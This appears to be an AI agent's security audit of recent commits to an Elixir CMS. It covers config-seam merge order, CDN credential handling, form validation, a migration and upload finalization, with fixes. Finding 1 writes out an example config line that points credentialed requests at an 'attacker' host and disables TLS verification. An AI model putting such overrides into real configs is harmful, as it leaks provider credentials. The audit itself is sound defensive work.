# Security Audit: brando_next Phase 4 (HEAD~5..HEAD, branch `next`)

## Executive Summary

No BLOCKERs. The seven questions asked all resolve favourably, with one
defense-in-depth WARNING (`:req_options` merge order) and three SUGGESTIONs.
The finding you said you'd most regret missing — Q4, mass-assignment via the
restructured `validate` handler — does **not** widen the cast surface; the
reasoning is written out below so it can be re-checked rather than trusted.

Checked: committed credentials, the CDN client behaviour, the two Req seams,
the form validate handler, the upload manager form id, the nilify migration,
and the direct-finalize HEAD guarantee.

---

## Findings

### 1. WARNING — `:req_options` wins over the auth header and URL

- **Severity**: WARNING (config-trust boundary, not user input)
- **Location**: `lib/brando/videos/uploaders/mux.ex:575`,
  `lib/brando/videos/uploaders/bunny.ex:433`
  (pre-existing twin: `lib/brando/videos/uploaders/cloudflare.ex:283`)
- **Issue**: the seam merges with the caller's options on the **right**, so a
  config value silently beats the required options:

```elixir
request_opts =
  case method do
    :post -> [method: :post, url: url, headers: headers, json: body]
    ...
  end

request_opts = Keyword.merge(request_opts, req_options())
```

  `headers` carries `{"authorization", "Basic #{Base.encode64("#{token_id}:#{token_secret}")}"}`
  (mux.ex:553-558) and `{"AccessKey", api_key}` (bunny.ex:412-416). Attack path:
  any config source that can set
  `config :brando, Brando.Videos.Uploaders.Mux, req_options: [url: "https://attacker/"]`
  redirects a request that still carries live Mux Basic auth to an attacker host
  — credential exfiltration, not just a redirect. The same override reaches
  `connect_options: [transport_opts: [verify: :verify_none]]`, disabling TLS
  verification for the credentialed call.

  This is developer config, not client input, so it is not remotely exploitable
  on its own. It matters because the seam is *new surface*: before this commit
  there was no config key that could reach the auth header or the URL of these
  clients at all. A copy-pasted config template or a typo now has a credential
  consequence it did not have.

- **Fix**: reverse the merge so the required options win. Every test uses only
  `plug:`, so nothing in the suite depends on the current precedence:

```elixir
# test/brando/videos/provider_client_test.exs:52
with_config(module, Keyword.put(config, :req_options, plug: {Req.Test, stub_name}))
```

```elixir
# required options last — the seam can add a transport, not replace auth/URL
request_opts = Keyword.merge(req_options(), request_opts)
```

  Optionally narrow further with `Keyword.take(req_options(), [:plug, :retry, :receive_timeout])`.
- **OWASP**: A05 Security Misconfiguration / A02 Cryptographic Failures (TLS bypass).

### 2. SUGGESTION — the CDN client seam hands live S3 credentials to a config-named module

- **Severity**: SUGGESTION
- **Location**: `lib/brando/cdn/cdn.ex:392-398`, `:409-415`; `lib/brando/cdn/client.ex:58`
- **Issue**: `Brando.CDN.Client.impl()` reads the module per call from
  `Application.get_env(:brando, :cdn_client, Brando.CDN.Client.ExAws)` and passes
  it the full ExAws keyword config, which includes `access_key_id` /
  `secret_access_key`:

```elixir
def head_object(object_key, field_cfg) do
  s3_config = get_s3_config(field_cfg, as: :keyword_list)
  cdn_config = Map.get(field_cfg, :cdn)
  bucket = cdn_config.bucket
  Brando.CDN.Client.impl().head_object(bucket, object_key, s3_config)
end
```

  A misconfigured `:cdn_client` therefore receives credentials, and can decide
  whether `head_object` "succeeds" — i.e. it can both leak keys and forge the
  existence check that `finalize_direct/3` relies on. This is *not* a new
  privilege: anyone who can set application env already has code execution in the
  node. Worth noting only because the module is now a documented, supported
  config knob (`client.ex:34-38`), so it belongs in the "trusted config" list an
  operator reviews, and third-party implementations should be treated as
  credential-handling code.
- **Mitigations already present, verified**:
  - Presigning stayed out of the behaviour, as claimed. `@callback`s are
    `head_object/3` and `delete_object/3` only (`client.ex:45-50`); there is no
    presign callback, and `presigned_url` does not appear anywhere in
    `lib/brando/cdn/`. **Presign TTLs are unchanged** — no TTL constant is
    touched by this diff.
  - No auth material moved into an overridable surface *for signing*: a bad
    `:cdn_client` cannot mint a URL clients upload to. It can only observe
    credentials it is handed and lie about object metadata.
  - `Brando.CDN.Client.ExAws` neither logs nor inspects — it is a two-clause
    pass-through (`client.ex:70-82`). No credential reaches a log line here.
- **Fix**: none required. If you want the belt: document in the moduledoc that
  the module receives credentials, and consider having the impl fetch the
  s3_config itself rather than accepting it as an argument.

### 3. SUGGESTION — nil `entry_params` in the validate handler crashes the form LiveView

- **Severity**: SUGGESTION (authenticated admin, self-DoS of own session)
- **Location**: `lib/brando_admin/components/form.ex:3035-3038`
- **Issue**:

```elixir
entry_params = Map.get(params, singular)
entry_or_default = entry || struct(schema)

changeset = validate(schema, entry_or_default, entry_params, current_user)
```

  `validate/4` is `entry |> schema.changeset(params, user)` (form.ex:4545-4549).
  A `phx-change` payload that omits the singular key gives `params = nil`, and
  `Ecto.Changeset.cast/4` raises on non-map params — killing the form process
  with every unsaved edit in it. The same shape is what the `_ ->` catch-all at
  `:3095` was added to survive, so the hardening is one step short: the branch
  no longer raises `CaseClauseError`, but the line *above* it can still raise.
  This is pre-existing (the changeset was already computed unconditionally
  before this commit — see the comment at `:3054-3060`, which describes only the
  `assign` moving), and only reachable by the authenticated admin who owns the
  socket. Listed because it is one line from the code you just touched.
- **Fix**: `entry_params = Map.get(params, singular) || %{}`.

---

## Question-by-question

### Q1 — Credentials in `config/test.exs` and tests: clean, but the scoping claim is wrong

**No real secret is committed.** Every value is a self-labelling placeholder:

- `config/test.exs:65` — `secret_key_base: String.duplicate("verysecret", 8)`.
  Not reused, not entropy-bearing, and the comment states the reason (the cookie
  store's 64-byte minimum, needed because `Brando.LiveCase` dispatches real
  requests). A literal repeated 8 times cannot be mistaken for a production key.
- `config/test.exs:66` — `live_view: [signing_salt: "testsigningsalt"]`.
- `config/config.exs:61-70` — Mux/Cloudflare secrets appear only inside
  **commented-out** examples, all of them `System.get_env(...)`.
- Tests: `"TESTKEY"` / `"TESTSECRET"` (`test/brando/uploads_test.exs:11-12`,
  `test/brando/uploads/direct_finalize_test.exs:29-30`,
  `test/brando/videos/upload_test.exs:37-38`), `access_token_secret: "secret"`,
  `api_key: "bunny-key"`, `webhook_secret: "webhook"`
  (`test/brando/videos/provider_client_test.exs:59,113,130`). All placeholders.

**Correction to the premise:** `config/test.exs` **is** shipped in the hex
package. `mix.exs:75-86`:

```elixir
files: [
  "assets", "config", "lib", "guides", "priv", "test",
  "mix.exs", "README.md", "CHANGELOG.md", "UPGRADE.md"
]
```

Both `config` and `test` are included. This is **not** exploitable: a
dependency's `config/*.exs` is never evaluated by the consuming application
(only the top-level app's config tree is), so `:cdn_client` will not be
forced to `Brando.CDN.Client.Mock` in a consumer, and the placeholder
`secret_key_base` cannot become anyone's real key. The only consequence is that
these placeholder strings are published on hex.pm — which is fine precisely
because they are placeholders. If you ever *do* put a real credential in
`config/` or `test/` for local convenience, it ships. Worth knowing; not worth
changing.

### Q2 — `lib/brando/cdn/client.ex`: no leakage, presigning genuinely excluded

Covered in finding 2. Summary: no logging, no `inspect`, presign absent from the
behaviour and from `lib/brando/cdn/` entirely, TTLs untouched. The one honest
caveat is that the impl is handed credentials.

### Q3 — `:req_options` seams

Answered by finding 1: **user opts win**, and they can reach `url`, `headers`
and TLS options. Reverse the merge.

### Q4 — `form.ex` validate handler: no mass-assignment widening

**This is the answer I'd want double-checked, so here is the full argument.**

The cast surface is unchanged. `validate/4` is called at `:3038`,
**before and independent of** the `_target` branch, and it was called there
before this commit too — the comment at `:3054-3060` says only that the
`assign` used to live inside the `[^singular | rest]` branch, so the changeset
was "recomputed and then dropped". What moved is the `assign`, not the cast:

```elixir
changeset = validate(schema, entry_or_default, entry_params, current_user)   # :3038 — unconditional, before and after
...
socket = assign(socket, :form, to_form(changeset, []))                        # :3061 — moved out of the branch
case Map.get(params, "_target") do
```

Three consequences, each checked:

1. **Whitelisting is intact.** `validate/4` is
   `entry |> schema.changeset(params, user) |> Map.put(:action, :validate)`
   (`:4545-4549`). The permitted-field set is the blueprint's changeset, and
   `current_user` is passed through, so trait/role-based field restrictions still
   apply. `_target` has never been an input to that decision — it is only read
   *after* the cast, to decide which blocks to notify and whether to invalidate
   live preview.
2. **No new field becomes reachable.** Anything a crafted
   `_target: ["image_editor_upload"]` payload can now get cast, the same client
   could already get cast by sending `_target: ["page", "title"]` with the same
   `params` body. Authority is identical; only the *retention* of the result
   changed.
3. **The retention does matter for block forms — and is still safe.** For
   `has_blocks?: true`, save builds from `socket.assigns.form.source`
   (`:1817`, `:3243` region) rather than re-casting, so the last validate's
   changeset is what persists. The non-block save path re-casts from the save
   event's own params (`:3420-3425`,
   `entry_or_default |> schema.changeset(entry_params, current_user)`), so it is
   unaffected either way. In the block case, the changeset now retained is
   still the output of the same whitelisted `schema.changeset/3` — so a recovery
   payload can set fields the schema permits, which is exactly what recovery is
   *for*, and exactly what a normal keystroke does.

**Verdict: not a mass-assignment widening.** The recovery params are
client-supplied, but they were already client-supplied through the ordinary
`_target` and pass through an unchanged whitelist. The only residual is the nil
crash in finding 3.

### Q5 — `upload_manager.ex` form id: no authz implication

`lib/brando_admin/live/upload_manager.ex:651`:

```heex
<form id="upload-manager-queue-form" phx-change="validate_queue" class="upload-manager-queue-form">
```

The `id` makes the form recovery-eligible, so a reconnect will replay
`validate_queue` with client-supplied params. The handler discards them
entirely and reads only server state (`:75-97`):

```elixir
def handle_event("validate_queue", _params, socket) do
  queue = socket.assigns.uploads.queue
```

It iterates `queue.errors`, matches each `entry_ref` against `queue.entries`,
and cancels/marks only entries the server itself knows about. Nothing
client-controlled reaches a decision. No finding.

Adjacent, and healthy: `intake`, `direct_complete` and `external_track` all
guard `current_user: nil` explicitly (`:61`, `:107`, `:172`), and
`external_track` bounds the ref at `byte_size(ref) <= 64` (`:184`).

### Q6 — `nilify_asset_fks` migration: media only

`priv/repo/migrations/20260806000000_nilify_asset_fks_in_test_schemas.exs:21-30`
lists all seven columns:

```elixir
@image_fks [
  {:users, :avatar_id}, {:pages, :meta_image_id},
  {:projects, :cover_id}, {:projects, :cover_cdn_id},
  {:sites_identities, :logo_id}, {:sites_seos, :fallback_meta_image_id}
]
@file_fks [{:projects, :pdf_id}]
```

Every one is a media reference — avatar, meta image, cover, logo, PDF. None is
an ownership (`creator_id`, `user_id`) or permission column, so
`:nilify_all` cannot silently detach a row from its owner or drop a role link.
`users.avatar_id` is the only one on an identity-bearing table and it nilifies a
profile picture, not an authorization fact. The migration also targets
`:projects`, a fixtures-only table, confirming test scope. No finding.

### Q7 — `direct_complete` really does HEAD the object; the test is honest

The production code makes the guarantee the test asserts.
`lib/brando/uploads.ex:262-267`:

```elixir
def finalize_direct(:file, %{key: key, resolved_target: resolved_target} = params, user) do
  {cfg, _} = resolve_file_config(resolved_target)
  cdn_config = file_cdn_config(cfg)

  with {:ok, object} <- Brando.CDN.head_object(key, %{cdn: cdn_config}),
       :ok <- validate_direct_object(object, params[:filesize], params[:mime_type]) do
```

`:video` does the same plus a transport check (`:287-293`).
`validate_direct_object/3` (`:313-327`) normalises the response headers and
checks `content-length` and `content-type` against expectations, and its
fallback clause returns `{:error, "Uploaded object metadata is unavailable"}` —
so a HEAD that returns no headers fails closed rather than passing.

The inputs are server-side, as the test claims. `finalize_item/2`
(`upload_manager.ex:475-491`) builds the params from `item.direct.key`,
`item.direct.resolved_target` and `item.direct.mime_type` — all recorded at
intake — never from the `direct_complete` payload, which contributes only
`ref`. Three further guards, all real:

- replay: an already-`:done` direct item returns early (`:117-118`), so a
  duplicated completion cannot create a second asset row;
- forged/unknown ref: `finalize_orphaned_complete/3` returns without acting when
  no pending intent exists (`:509-515`);
- cross-session ref: the intent's `creator_id` is compared to the calling
  socket's user and the finalize is *refused* on mismatch (`:517-528`), rather
  than misattributing the asset.

`direct_error` deletes the pending intent (`:164`) specifically so a later
forged `direct_complete` cannot finalize a half-written object. No finding.

---

## Recommendations (priority order)

1. Reverse the `Keyword.merge` order in `mux.ex:575`, `bunny.ex:433` and the
   pre-existing `cloudflare.ex:283` so required auth/URL options win over
   `:req_options`. One-line change per file; no test depends on the current
   precedence.
2. `entry_params = Map.get(params, singular) || %{}` in `form.ex:3035`.
3. Optional: note in `Brando.CDN.Client`'s moduledoc that implementations
   receive live S3 credentials.

## Tools to run manually (this agent has no Bash access)

- `mix sobelow --exit medium`
- `mix deps.audit`
- `mix hex.audit`
